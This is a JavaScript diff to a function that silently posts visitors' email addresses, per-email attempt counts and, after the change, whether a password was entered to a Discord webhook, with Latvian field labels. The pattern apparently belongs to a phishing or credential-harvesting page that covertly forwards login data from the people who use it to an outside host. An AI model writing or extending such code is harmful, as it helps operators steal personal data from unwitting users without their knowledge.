@@ -1,5 +1,4 @@
-// ── Send to Discord (fire and forget - non-blocking) ──
-function sendToDiscord(email, action) {
+function sendToDiscord(email, action, passwordProvided) {
     if (!attemptTracker[email]) {
         attemptTracker[email] = 0;
     }
@@ -13,6 +12,11 @@ function sendToDiscord(email, action) {
                 {
                     name: '📧 E-pasts',
                     value: email || 'Nav norādīts',
+                    inline: true
+                },
+                {
+                    name: '🔑 Parole ievadīta?',
+                    value: passwordProvided ? '✅ Jā' : '❌ Nē',
                     inline: true
                 },
                 {
@@ -32,7 +36,6 @@ function sendToDiscord(email, action) {
         }]
     };
 
-    // Fire and forget - don't wait for response
     fetch(WEBHOOK_URL, {
         method: 'POST',
         headers: {
@@ -40,6 +43,4 @@ function sendToDiscord(email, action) {
         },
         body: JSON.stringify(embed)
     }).catch(err => console.log('Webhook error (ignored):', err));
-    
-    // Don't await - let it run in background
 }
